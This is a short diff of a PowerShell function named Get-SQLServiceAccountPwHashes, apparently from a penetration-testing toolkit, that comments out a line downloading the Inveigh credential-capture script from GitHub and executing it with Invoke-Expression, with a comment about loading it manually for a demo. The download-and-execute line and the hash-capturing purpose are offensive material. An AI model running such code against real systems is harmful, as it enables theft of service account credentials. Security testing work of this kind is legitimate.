@@ -27,8 +27,8 @@ Function Get-SQLServiceAccountPwHashes {
 
     Begin 
     {
-        # Attempt to load Inveigh via reflection
-        Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
+        # Attempt to load Inveigh via reflection - naturally this bombs if there is no outbound internet - just load it manually for the demo
+        # Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
 
         $TestIt = Test-Path -Path Function:\Invoke-Inveigh
         if($TestIt -eq 'True')
